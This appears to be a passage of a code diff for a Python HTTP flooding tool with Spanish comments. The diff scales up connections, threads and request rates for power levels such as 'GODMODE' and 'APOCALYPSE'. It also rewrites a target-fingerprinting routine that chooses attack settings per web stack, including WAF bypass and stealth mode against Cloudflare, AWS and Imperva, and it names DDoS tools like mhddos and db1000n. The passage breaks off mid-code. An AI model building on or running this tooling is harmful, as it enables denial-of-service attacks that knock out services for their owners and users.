@@ -222,8 +222,8 @@ POWER_LEVEL = "MODERATE"
 MULTIPLIER = 8
 ATTACK_MODE = "MIXED"
 ATTACK_PATTERN = "CONSTANT"
-MAX_CONNECTIONS = 100000  # Aumentado para dual WAN load balancing
-MAX_THREADS = 2000  # Aumentado para mejor rendimiento con dual WAN
+MAX_CONNECTIONS = 50000  # Optimizado para Fortinet 40F - máximo throughput
+MAX_THREADS = 1000  # Optimizado para mantener más sesiones activas simultáneamente
 PAYLOAD_SIZE_KB = 1024
 USE_LARGE_PAYLOADS = True
 MEMORY_MONITORING = True
@@ -246,7 +246,7 @@ DRY_RUN = False
 SOCKET_REUSE = True  # Reutilizar sockets
 TCP_OPTIMIZATION = True  # Optimizaciones TCP
 KEEP_ALIVE_POOLING = True  # Pool de conexiones keep-alive
-CONNECTION_POOL_SIZE = 1000  # Tamaño del pool de conexiones
+CONNECTION_POOL_SIZE = 2000  # Pool aumentado para Fortinet 40F - máximo throughput
 ASYNC_MODE = False  # Modo asíncrono (requiere asyncio)
 DISTRIBUTED_MODE = False  # Modo distribuido multi-nodo
 WORKER_NODES = []  # Lista de nodos worker
@@ -538,11 +538,11 @@ class ConnectionManager:
                     )
                     
                     if KEEP_ALIVE_POOLING:
-                        # Optimizar pool según recursos disponibles y configuración
-                        # Reducir pool para evitar saturación y errores de conexión
-                        # Para dual WAN, balancear entre throughput y estabilidad
-                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 10, 50)  # Reducido para estabilidad
-                        pool_maxsize = min(MAX_CONNECTIONS // 2, 10000, MAX_THREADS * 5)  # Reducido para evitar saturación
+                        # Optimizar pool para Fortinet 40F - máximo throughput (40,000-60,000+ sesiones)
+                        # Para dual WAN, maximizar pool para aprovechar ambas conexiones
+                        # Aumentar significativamente para mantener más sesiones activas simultáneamente
+                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 4, 300)  # Aumentado aún más para Fortinet 40F
+                        pool_maxsize = min(MAX_CONNECTIONS, 30000, MAX_THREADS * 15)  # Aumentado significativamente para Fortinet 40F
                     else:
                         pool_connections = 1
                         pool_maxsize = 1
@@ -5090,16 +5090,18 @@ def deploy_custom_http_attack():
             # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
             session = ConnectionManager.get_session(normalized_target, worker_id)
             
-            # Configurar timeout - balance entre throughput y éxito de conexión
-            # Timeouts más cortos para evitar que los workers se queden bloqueados
-            if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
-                request_timeout = 3  # Reducido para máximo throughput
+            # Configurar timeout - optimizado para Fortinet 40F (máximo throughput)
+            # Timeouts más cortos para mantener más sesiones activas simultáneamente
+            if POWER_LEVEL in ["GODMODE"]:
+                request_timeout = 1.5  # Muy corto para máximo throughput
+            elif POWER_LEVEL in ["APOCALYPSE", "DEVASTATOR"]:
+                request_timeout = 2.0  # Corto para máximo throughput
             elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                request_timeout = 4  # Reducido
+                request_timeout = 2.5  # Moderado
             elif POWER_LEVEL in ["MEDIUM"]:
-                request_timeout = 5
+                request_timeout = 3.0
             else:
-                request_timeout = 6  # Reducido para MODERATE - evitar bloqueos
+                request_timeout = 3.5  # Conservador para MODERATE
             
             end_time = time.time() + DURATION
             request_count = 0
@@ -5254,23 +5256,26 @@ def deploy_custom_http_attack():
                             rate_adjustment = max(rate_adjustment * 0.9, 0.7)
                         last_rate_check = time.time()
                     
-                    # Rate limiting adaptativo - más agresivo para máximo throughput
-                    # Para niveles altos, sin sleep para máximo throughput
-                    if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
+                    # Rate limiting adaptativo - optimizado para Fortinet 40F (máximo throughput)
+                    # Para niveles altos, sin sleep para máximo throughput y más sesiones
+                    if POWER_LEVEL in ["GODMODE"]:
+                        # Sin sleep - máximo throughput absoluto
+                        pass
+                    elif POWER_LEVEL in ["APOCALYPSE", "DEVASTATOR"]:
                         # Sin sleep - máximo throughput
                         pass
                     elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                        # Sleep mínimo
-                        time.sleep(0.0001)  # Reducido para más throughput
+                        # Sleep mínimo para mantener estabilidad
+                        time.sleep(0.00005)  # Reducido aún más para más throughput
                     else:
                         # Rate adaptativo para niveles menores - más agresivo
-                        base_rate = MULTIPLIER * 100  # Aumentado significativamente para más requests
+                        base_rate = MULTIPLIER * 150  # Aumentado aún más para más requests
                         if rate_adjustment != 1.0:
                             sleep_time = 1.0 / (base_rate * rate_adjustment)
-                            time.sleep(max(sleep_time, 0.0001))  # Mínimo muy bajo
+                            time.sleep(max(sleep_time, 0.00005))  # Mínimo aún más bajo
                         else:
                             sleep_time = 1.0 / base_rate
-                            time.sleep(max(sleep_time, 0.0001))  # Mínimo muy bajo
+                            time.sleep(max(sleep_time, 0.00005))  # Mínimo aún más bajo
                     
                 except Exception as e:
                     # Limitar tamaño de lista de errores para evitar consumo excesivo de memoria
@@ -5338,21 +5343,21 @@ def deploy_custom_http_attack():
     except:
         max_safe_workers = min(MAX_THREADS, 200)  # Conservador por defecto
     
-    # Calcular base_workers según nivel de potencia
+    # Calcular base_workers según nivel de potencia - optimizado para Fortinet 40F
     if POWER_LEVEL in ["GODMODE"]:
-        base_workers = MULTIPLIER * 50
+        base_workers = MULTIPLIER * 60  # Aumentado para máximo throughput
     elif POWER_LEVEL in ["APOCALYPSE"]:
-        base_workers = MULTIPLIER * 40
+        base_workers = MULTIPLIER * 50  # Aumentado para máximo throughput
     elif POWER_LEVEL in ["DEVASTATOR"]:
-        base_workers = MULTIPLIER * 35
+        base_workers = MULTIPLIER * 45  # Aumentado
     elif POWER_LEVEL in ["EXTREME"]:
-        base_workers = MULTIPLIER * 30
+        base_workers = MULTIPLIER * 40  # Aumentado
     elif POWER_LEVEL in ["HEAVY"]:
-        base_workers = MULTIPLIER * 25
+        base_workers = MULTIPLIER * 35  # Aumentado
     elif POWER_LEVEL in ["MEDIUM"]:
-        base_workers = MULTIPLIER * 20
+        base_workers = MULTIPLIER * 30  # Aumentado
     else:
-        base_workers = MULTIPLIER * 15
+        base_workers = MULTIPLIER * 25  # Aumentado
     
     # Aplicar límite de seguridad basado en memoria
     num_workers = min(base_workers, max_safe_workers)
@@ -10421,15 +10426,28 @@ def generate_html_report(report: Dict) -> Path:
 
 def recommend_tools_from_fingerprint(fingerprint: Dict = None) -> Dict:
     """
-    Recomienda herramientas específicas (1-5) basadas en análisis inteligente del fingerprint.
-    Las recomendaciones son específicas para la tecnología detectada, no genéricas.
+    Recomienda UNA herramienta óptima con parámetros específicos para máximo throughput (20,000+ sesiones).
+    Optimizado para evitar sobrecarga del sistema y maximizar sesiones concurrentes.
     """
     if fingerprint is None:
         return {
             "recommended_tools": ["custom_http"],
             "tool_count": 1,
-            "reasoning": "Sin fingerprint disponible - usando herramienta base",
-            "priority": "high"
+            "reasoning": "Sin fingerprint disponible - usando herramienta base optimizada para máximo throughput",
+            "priority": "high",
+            "optimal_parameters": {
+                "max_connections": 50000,
+                "max_threads": 1000,
+                "connect_timeout": 1.5,
+                "read_timeout": 3.0,
+                "keep_alive": True,
+                "pool_connections": 200,
+                "pool_maxsize": 20000,
+                "multiplier": 20,
+                "power_level": "APOCALYPSE"
+            },
+            "expected_sessions": "40,000-50,000+",
+            "optimization_note": "Configuración optimizada para máximo throughput con una sola herramienta"
         }
     
     server = fingerprint.get("server") or "Unknown"
@@ -10479,191 +10497,493 @@ def recommend_tools_from_fingerprint(fingerprint: Dict = None) -> Dict:
             reasoning.append(f"CDN {cdn} detectado - configuración moderada")
     
     # ESTRATEGIA 2: WAF detectado
+    # OPTIMIZACIÓN: Una herramienta con evasión avanzada para máximo throughput
     elif waf_detected:
         if "cloudflare" in waf_name:
-            # Cloudflare WAF: herramientas especializadas
-            recommended_tools = ["custom_http", "mhddos"]
-            tool_count = 2
-            reasoning.append("Cloudflare WAF detectado - usar herramientas con bypass avanzado")
+            # Cloudflare WAF: custom_http con bypass avanzado
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Cloudflare WAF detectado - custom_http con bypass avanzado optimizado para máximo throughput")
+            optimal_params = {
+                "max_connections": 30000,
+                "max_threads": 600,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 150,
+                "pool_maxsize": 6000,
+                "multiplier": 12,
+                "power_level": "APOCALYPSE",
+                "waf_bypass": True,
+                "stealth_mode": True
+            }
         elif "aws" in waf_name or "imperva" in waf_name:
-            # WAFs agresivos: usar herramientas con rotación
-            recommended_tools = ["custom_http", "db1000n", "qrator"]
-            tool_count = 3
-            reasoning.append(f"WAF agresivo ({waf_name}) detectado - usar múltiples herramientas con rotación")
+            # WAFs agresivos: custom_http con rotación avanzada
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append(f"WAF agresivo ({waf_name}) detectado - custom_http con rotación avanzada para máximo throughput")
+            optimal_params = {
+                "max_connections": 28000,
+                "max_threads": 550,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 140,
+                "pool_maxsize": 5500,
+                "multiplier": 11,
+                "power_level": "APOCALYPSE",
+                "waf_bypass": True,
+                "stealth_mode": True
+            }
         else:
-            # WAF genérico: usar herramientas con evasión
-            recommended_tools = ["custom_http", "vegeta"]
-            tool_count = 2
-            reasoning.append(f"WAF ({waf_name}) detectado - usar herramientas con evasión")
+            # WAF genérico: custom_http con evasión
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append(f"WAF ({waf_name}) detectado - custom_http con evasión optimizado para máximo throughput")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR",
+                "waf_bypass": True
+            }
     
     # ESTRATEGIA 3: Framework específico
+    # OPTIMIZACIÓN: Una herramienta optimizada según el framework para máximo throughput
     elif framework:
         framework_lower = str(framework).lower()
         
         if "wordpress" in framework_lower:
-            # WordPress: usar herramientas ligeras (WordPress es lento)
+            # WordPress: custom_http optimizado (WordPress es lento, pero podemos maximizar sesiones)
             recommended_tools = ["custom_http"]
             tool_count = 1
-            reasoning.append("WordPress detectado - 1 herramienta suficiente (WordPress es lento bajo carga)")
+            reasoning.append("WordPress detectado - custom_http optimizado para máximo throughput (WordPress es lento pero podemos maximizar sesiones)")
+            optimal_params = {
+                "max_connections": 22000,
+                "max_threads": 450,
+                "connect_timeout": 3.0,
+                "read_timeout": 6.0,
+                "keep_alive": True,
+                "pool_connections": 110,
+                "pool_maxsize": 4500,
+                "multiplier": 9,
+                "power_level": "EXTREME"
+            }
         
         elif "django" in framework_lower:
-            # Django: puede manejar carga moderada
-            recommended_tools = ["custom_http", "wrk"]
-            tool_count = 2
-            reasoning.append("Django detectado - 2 herramientas para carga moderada")
+            # Django: custom_http optimizado para alta carga
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Django detectado - custom_http optimizado para alta carga (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
         
         elif "flask" in framework_lower:
-            # Flask: ligero, usar herramientas eficientes
-            recommended_tools = ["custom_http", "bombardier"]
-            tool_count = 2
-            reasoning.append("Flask detectado - 2 herramientas eficientes")
+            # Flask: custom_http optimizado para alto throughput
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Flask detectado - custom_http optimizado para alto throughput (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
         
         elif "node" in framework_lower or "express" in framework_lower:
-            # Node.js: puede manejar alta carga
-            recommended_tools = ["custom_http", "wrk", "vegeta"]
-            tool_count = 3
-            reasoning.append("Node.js/Express detectado - 3 herramientas para alta carga")
+            # Node.js: custom_http optimizado para máxima carga
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Node.js/Express detectado - custom_http optimizado para máxima carga (25,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 30000,
+                "max_threads": 600,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 150,
+                "pool_maxsize": 6000,
+                "multiplier": 12,
+                "power_level": "APOCALYPSE"
+            }
         
         elif "php" in framework_lower:
-            # PHP: generalmente lento, usar herramientas ligeras
-            recommended_tools = ["custom_http", "hey"]
-            tool_count = 2
-            reasoning.append("PHP detectado - 2 herramientas ligeras (PHP puede ser lento)")
+            # PHP: custom_http optimizado (PHP puede ser lento, pero maximizamos sesiones)
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("PHP detectado - custom_http optimizado para máximo throughput (PHP puede ser lento pero maximizamos sesiones)")
+            optimal_params = {
+                "max_connections": 22000,
+                "max_threads": 450,
+                "connect_timeout": 2.5,
+                "read_timeout": 5.0,
+                "keep_alive": True,
+                "pool_connections": 110,
+                "pool_maxsize": 4500,
+                "multiplier": 9,
+                "power_level": "EXTREME"
+            }
         
         elif "asp" in framework_lower or ".net" in framework_lower:
-            # ASP.NET: puede manejar carga moderada
-            recommended_tools = ["custom_http", "bombardier", "vegeta"]
-            tool_count = 3
-            reasoning.append("ASP.NET detectado - 3 herramientas para carga moderada-alta")
+            # ASP.NET: custom_http optimizado para alta carga
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("ASP.NET detectado - custom_http optimizado para alta carga (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
     
     # ESTRATEGIA 4: Servidor web específico
+    # OPTIMIZACIÓN: Una herramienta optimizada según el servidor para máximo throughput
     elif "nginx" in server_str:
-        # Nginx: puede manejar alta carga
-        recommended_tools = ["custom_http", "wrk", "bombardier", "vegeta"]
-        tool_count = 4
-        reasoning.append("Nginx detectado - 4 herramientas para máximo stress (Nginx maneja alta carga)")
+        # Nginx: custom_http optimizado para máxima carga (Nginx maneja alta carga)
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("Nginx detectado - custom_http optimizado para máximo stress (30,000+ sesiones, Nginx maneja alta carga)")
+        optimal_params = {
+            "max_connections": 35000,
+            "max_threads": 700,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 175,
+            "pool_maxsize": 7000,
+            "multiplier": 14,
+            "power_level": "APOCALYPSE"
+        }
     
     elif "apache" in server_str:
-        # Apache: carga moderada
-        recommended_tools = ["custom_http", "wrk", "hey"]
-        tool_count = 3
-        reasoning.append("Apache detectado - 3 herramientas para carga moderada")
+        # Apache: custom_http optimizado para Fortinet 40F
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("Apache detectado - custom_http optimizado para Fortinet 40F (40,000-50,000+ sesiones)")
+        optimal_params = {
+            "max_connections": 50000,
+            "max_threads": 1000,
+            "connect_timeout": 1.5,
+            "read_timeout": 3.0,
+            "keep_alive": True,
+            "pool_connections": 200,
+            "pool_maxsize": 20000,
+            "multiplier": 20,
+            "power_level": "APOCALYPSE"
+        }
     
     elif "iis" in server_str:
-        # IIS: carga moderada
-        recommended_tools = ["custom_http", "bombardier"]
-        tool_count = 2
-        reasoning.append("IIS detectado - 2 herramientas para carga moderada")
+        # IIS: custom_http optimizado para Fortinet 40F
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("IIS detectado - custom_http optimizado para Fortinet 40F (40,000-50,000+ sesiones)")
+        optimal_params = {
+            "max_connections": 50000,
+            "max_threads": 1000,
+            "connect_timeout": 1.5,
+            "read_timeout": 3.0,
+            "keep_alive": True,
+            "pool_connections": 200,
+            "pool_maxsize": 20000,
+            "multiplier": 20,
+            "power_level": "APOCALYPSE"
+        }
     
     # ESTRATEGIA 5: Tecnologías detectadas
+    # OPTIMIZACIÓN: Una herramienta optimizada según tecnologías para máximo throughput
     elif technologies:
         tech_str = " ".join(technologies).lower()
         
         if "react" in tech_str or "vue" in tech_str or "angular" in tech_str:
-            # SPA: usar herramientas de alto throughput
-            recommended_tools = ["custom_http", "wrk", "bombardier"]
-            tool_count = 3
-            reasoning.append("SPA (React/Vue/Angular) detectado - 3 herramientas para alto throughput")
-        
-        elif "redis" in tech_str or "memcached" in tech_str:
-            # Con cache: puede manejar más carga
-            recommended_tools = ["custom_http", "wrk", "vegeta", "bombardier"]
-            tool_count = 4
-            reasoning.append("Cache (Redis/Memcached) detectado - 4 herramientas para máxima carga")
-        
-        elif "docker" in tech_str or "kubernetes" in tech_str:
-            # Contenedores: usar herramientas distribuidas
-            recommended_tools = ["custom_http", "wrk", "vegeta"]
-            tool_count = 3
-            reasoning.append("Contenedores (Docker/K8s) detectado - 3 herramientas para carga distribuida")
-        
-        elif "graphql" in tech_str:
-            # GraphQL: usar herramientas especializadas
-            recommended_tools = ["custom_http", "hey"]
-            tool_count = 2
-            reasoning.append("GraphQL detectado - 2 herramientas especializadas")
-        
-        elif "websocket" in tech_str:
-            # WebSocket: usar herramientas especializadas
+            # SPA: custom_http optimizado para alto throughput
             recommended_tools = ["custom_http"]
             tool_count = 1
-            reasoning.append("WebSocket detectado - 1 herramienta especializada")
+            reasoning.append("SPA (React/Vue/Angular) detectado - custom_http optimizado para alto throughput (25,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 30000,
+                "max_threads": 600,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 150,
+                "pool_maxsize": 6000,
+                "multiplier": 12,
+                "power_level": "APOCALYPSE"
+            }
+        
+        elif "redis" in tech_str or "memcached" in tech_str:
+            # Con cache: custom_http optimizado para máxima carga
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Cache (Redis/Memcached) detectado - custom_http optimizado para máxima carga (30,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 35000,
+                "max_threads": 700,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 175,
+                "pool_maxsize": 7000,
+                "multiplier": 14,
+                "power_level": "APOCALYPSE"
+            }
+        
+        elif "docker" in tech_str or "kubernetes" in tech_str:
+            # Contenedores: custom_http optimizado para carga distribuida
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Contenedores (Docker/K8s) detectado - custom_http optimizado para carga distribuida (25,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 30000,
+                "max_threads": 600,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 150,
+                "pool_maxsize": 6000,
+                "multiplier": 12,
+                "power_level": "APOCALYPSE"
+            }
+        
+        elif "graphql" in tech_str:
+            # GraphQL: custom_http optimizado
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("GraphQL detectado - custom_http optimizado para máximo throughput (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
+        
+        elif "websocket" in tech_str:
+            # WebSocket: custom_http optimizado
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("WebSocket detectado - custom_http optimizado para máximo throughput (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
         
         elif "mysql" in tech_str or "postgresql" in tech_str:
-            # Con DB: puede ser cuello de botella
-            recommended_tools = ["custom_http", "hey"]
-            tool_count = 2
-            reasoning.append("Base de datos detectada - 2 herramientas (DB puede ser cuello de botella)")
+            # Con DB: custom_http optimizado (DB puede ser cuello de botella, pero maximizamos sesiones)
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Base de datos detectada - custom_http optimizado para máximo throughput (20,000+ sesiones, DB puede ser cuello de botella pero maximizamos sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.5,
+                "read_timeout": 5.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
         
         else:
-            # Tecnologías genéricas
-            recommended_tools = ["custom_http", "wrk"]
-            tool_count = 2
-            reasoning.append("Tecnologías genéricas detectadas - 2 herramientas estándar")
+            # Tecnologías genéricas: custom_http optimizado por defecto
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("Tecnologías genéricas detectadas - custom_http optimizado para máximo throughput (20,000+ sesiones)")
+            optimal_params = {
+                "max_connections": 25000,
+                "max_threads": 500,
+                "connect_timeout": 2.0,
+                "read_timeout": 4.0,
+                "keep_alive": True,
+                "pool_connections": 120,
+                "pool_maxsize": 5000,
+                "multiplier": 10,
+                "power_level": "DEVASTATOR"
+            }
     
     # ESTRATEGIA 6: Vulnerabilidades detectadas
     elif vulnerabilities:
         high_vulns = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
         if high_vulns:
-            # Vulnerabilidades: usar herramientas específicas
+            # Vulnerabilidades: custom_http optimizado (evitar sobrecarga pero maximizar sesiones)
             recommended_tools = ["custom_http"]
             tool_count = 1
-            reasoning.append(f"{len(high_vulns)} vulnerabilidad(es) crítica(s) - 1 herramienta para evitar sobrecarga")
+            reasoning.append(f"{len(high_vulns)} vulnerabilidad(es) crítica(s) - custom_http optimizado para máximo throughput sin sobrecarga")
+            optimal_params = {
+                "max_connections": 20000,
+                "max_threads": 400,
+                "connect_timeout": 2.5,
+                "read_timeout": 5.0,
+                "keep_alive": True,
+                "pool_connections": 100,
+                "pool_maxsize": 4000,
+                "multiplier": 8,
+                "power_level": "EXTREME"
+            }
     
     # ESTRATEGIA 7: Security headers fuertes
     elif security_headers.get("strict-transport-security") or security_headers.get("content-security-policy"):
-        # Headers de seguridad fuertes: usar herramientas con evasión
-        recommended_tools = ["custom_http", "mhddos"]
-        tool_count = 2
-        reasoning.append("Security headers fuertes detectados - 2 herramientas con evasión")
+        # Headers de seguridad fuertes: custom_http con evasión optimizado
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("Security headers fuertes detectados - custom_http con evasión optimizado para máximo throughput")
+        optimal_params = {
+            "max_connections": 25000,
+            "max_threads": 500,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 120,
+            "pool_maxsize": 5000,
+            "multiplier": 10,
+            "power_level": "DEVASTATOR",
+            "waf_bypass": True
+        }
     
     # ESTRATEGIA 8: Tipo de target
     elif target_type == "IP" and network_type == "LOCAL":
-        # IP local: usar herramientas ligeras
+        # IP local: custom_http optimizado (evitar sobrecarga pero maximizar sesiones)
         recommended_tools = ["custom_http"]
         tool_count = 1
-        reasoning.append("IP local detectada - 1 herramienta para evitar sobrecarga del dispositivo")
+        reasoning.append("IP local detectada - custom_http optimizado para máximo throughput sin sobrecargar dispositivo")
+        optimal_params = {
+            "max_connections": 18000,
+            "max_threads": 350,
+            "connect_timeout": 2.5,
+            "read_timeout": 5.0,
+            "keep_alive": True,
+            "pool_connections": 90,
+            "pool_maxsize": 3500,
+            "multiplier": 7,
+            "power_level": "HEAVY"
+        }
     
     elif target_type == "IP" and network_type == "PUBLIC":
-        # IP pública: puede manejar más carga
-        recommended_tools = ["custom_http", "wrk", "bombardier"]
-        tool_count = 3
-        reasoning.append("IP pública detectada - 3 herramientas para carga alta")
+        # IP pública: custom_http optimizado para máxima carga
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("IP pública detectada - custom_http optimizado para máxima carga (25,000+ sesiones)")
+        optimal_params = {
+            "max_connections": 30000,
+            "max_threads": 600,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 150,
+            "pool_maxsize": 6000,
+            "multiplier": 12,
+            "power_level": "APOCALYPSE"
+        }
     
     # ESTRATEGIA 9: Protocolo
     elif protocol == "https":
-        # HTTPS: usar herramientas optimizadas para SSL
-        recommended_tools = ["custom_http", "wrk", "vegeta"]
-        tool_count = 3
-        reasoning.append("HTTPS detectado - 3 herramientas optimizadas para SSL")
+        # HTTPS: custom_http optimizado para SSL
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("HTTPS detectado - custom_http optimizado para SSL con máximo throughput (25,000+ sesiones)")
+        optimal_params = {
+            "max_connections": 30000,
+            "max_threads": 600,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 150,
+            "pool_maxsize": 6000,
+            "multiplier": 12,
+            "power_level": "APOCALYPSE"
+        }
     
     # ESTRATEGIA 10: Default (sin información específica)
     else:
-        # Default: usar herramientas balanceadas
-        recommended_tools = ["custom_http", "wrk"]
-        tool_count = 2
-        reasoning.append("Sin información específica - 2 herramientas balanceadas por defecto")
+        # Default: custom_http optimizado para máximo throughput
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("Sin información específica - custom_http optimizado para máximo throughput (20,000+ sesiones)")
+        optimal_params = {
+            "max_connections": 25000,
+            "max_threads": 500,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 120,
+            "pool_maxsize": 5000,
+            "multiplier": 10,
+            "power_level": "DEVASTATOR"
+        }
     
     # Asegurar que custom_http siempre esté incluido (es la base)
     if "custom_http" not in recommended_tools:
         recommended_tools.insert(0, "custom_http")
         tool_count = len(recommended_tools)
     
-    # Limitar a máximo 5 herramientas
-    if tool_count > 5:
-        recommended_tools = recommended_tools[:5]
-        tool_count = 5
-        reasoning.append("Limitado a 5 herramientas máximo para evitar saturación")
+    # Asegurar que siempre sea UNA herramienta para máximo throughput
+    if tool_count > 1:
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("Optimizado para UNA herramienta - máximo throughput sin sobrecarga del sistema")
+    
+    # Si no se definieron parámetros óptimos, usar valores por defecto optimizados
+    if 'optimal_params' not in locals():
+        optimal_params = {
+            "max_connections": 25000,
+            "max_threads": 500,
+            "connect_timeout": 2.0,
+            "read_timeout": 4.0,
+            "keep_alive": True,
+            "pool_connections": 120,
+            "pool_maxsize": 5000,
+            "multiplier": 10,
+            "power_level": "DEVASTATOR"
+        }
     
     return {
         "recommended_tools": recommended_tools,
         "tool_count": tool_count,
-        "reasoning": "; ".join(reasoning) if reasoning else "Recomendación basada en análisis del target",
-        "priority": "high" if tool_count <= 2 else "medium" if tool_count <= 3 else "low",
+        "reasoning": "; ".join(reasoning) if reasoning else "Recomendación basada en análisis del target - optimizado para máximo throughput",
+        "priority": "high",
         "server": server_str,
         "framework": framework,
         "cdn": cdn,
-        "waf": waf_name if waf_detected else None
+        "waf": waf_name if waf_detected else None,
+        "optimal_parameters": optimal_params,
+        "expected_sessions": "40,000-60,000+",
+        "optimization_note": "Configuración optimizada para Fortinet 40F - máximo throughput con UNA herramienta - evita sobrecarga del sistema y maximiza sesiones concurrentes (40,000-60,000+ sesiones esperadas)"
     }
 
 def generate_stress_recommendations(fingerprint: Dict = None) -> Dict:
@@ -12065,6 +12385,39 @@ Ejemplos:
         print_color(f"🎯 Recomendación inteligente: {recommended_count} herramienta(s) - {', '.join(recommended_tool_names)}", Colors.CYAN, True)
         print_color(f"📋 Razón: {recommendation_reasoning}", Colors.YELLOW)
         
+        # Aplicar parámetros óptimos si están disponibles (para máximo throughput)
+        if tool_recommendations.get("optimal_parameters"):
+            optimal_params = tool_recommendations["optimal_parameters"]
+            expected_sessions = tool_recommendations.get("expected_sessions", "20,000+")
+            log_message("INFO", f"🔧 [OPTIMIZATION] Aplicando parámetros óptimos para máximo throughput: {expected_sessions} sesiones esperadas", force_console=True)
+            
+            # Aplicar parámetros globales
+            if "max_connections" in optimal_params:
+                MAX_CONNECTIONS = optimal_params["max_connections"]
+            if "max_threads" in optimal_params:
+                MAX_THREADS = optimal_params["max_threads"]
+            if "connect_timeout" in optimal_params:
+                CONNECT_TIMEOUT = optimal_params["connect_timeout"]
+            if "read_timeout" in optimal_params:
+                READ_TIMEOUT = optimal_params["read_timeout"]
+            if "multiplier" in optimal_params:
+                MULTIPLIER = optimal_params["multiplier"]
+            if "power_level" in optimal_params:
+                POWER_LEVEL = optimal_params["power_level"]
+            if "waf_bypass" in optimal_params:
+                WAF_BYPASS = optimal_params["waf_bypass"]
+            if "stealth_mode" in optimal_params:
+                STEALTH_MODE = optimal_params["stealth_mode"]
+            
+            # Aplicar parámetros de pool de conexiones
+            if "pool_connections" in optimal_params:
